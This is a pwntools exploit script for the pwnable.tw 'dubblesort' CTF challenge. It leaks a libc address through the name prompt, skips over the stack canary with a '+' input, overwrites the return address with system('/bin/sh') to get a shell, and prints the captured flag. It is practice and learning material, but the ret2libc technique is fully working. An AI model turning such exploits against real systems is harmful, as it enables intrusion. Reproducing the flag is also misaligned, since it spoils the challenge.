# from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

# # io = process("./dubblesort")
# # io = remote("chall.pwnable.tw", 10101)

# remote_libc = "./libc_32.so.6"

# io = process("./dubblesort", env={'LD_PRELOAD': remote_libc})

# # elf = ELF("./dubblesort")
# # libc = elf.libc

# # 0xAF9

# # gdb.attach(io, "")
# # io.sendafter("What your name :", "aaaaaaaaaaaaaaaaaaaaaaaa\n")

# # res = io.recvuntil(",How many numbers", drop=True)



# # # res = res[6:]
# # print(res)
# # libc.address = u32(res[0:4])

# # log.info("libc_addr: 0x%x", u32(res[4:]))
# # log.info("libc_base: 0x%x", libc.address)

# # one = libc.address + 0xc9bab

# # log.info("one gadget: 0x%x", one)

# # io.sendlineafter("what to sort :", "43")



# # # 0   0   0   0x56
# # # +(*20)
# # # canary  0xf7    0xf7    0xf7   
# # # 0xf7  +  +  +   
# # # ret_addr


# # for _ in range(0, 3+3):
# #     io.sendlineafter("number : ", str(one - 1))

# # for _ in range(0, 20-3):
# #     io.sendlineafter("number : ", '0')

# # io.sendlineafter("number : ", str(one))

# # io.sendlineafter("number : ", 'a')

# io.interactive()


from pwn import *
p = remote('chall.pwnable.tw',10101)
#p = process('./dubblesort.dms')

elf_libc = ELF('./libc_32.so.6')
got_plt_offset = 0x1b0000

# leak libc address
payload_1 = "a"*24
p.recv()
p.sendline(payload_1)
libc_addr = u32(p.recv()[30:34])-0xa
libcbase_addr = libc_addr - got_plt_offset
#print hex(libcbase_addr)
#onegadget_addr =0x3a819 + libcbase_addr
sys_addr = libcbase_addr + elf_libc.symbols['system']
bin_sh_addr = libcbase_addr + next(elf_libc.search(b'/bin/sh'))



p.sendline('35')
p.recv()

for i in range(24):
    p.sendline('0')
    p.recv()

p.sendline('+')
p.recv()


for i in range(9):
    p.sendline(str(sys_addr))
    p.recv()
p.sendline(str(bin_sh_addr))
p.recv()

p.interactive()

# FLAG{Dubo_duBo_dub0_s0rttttttt}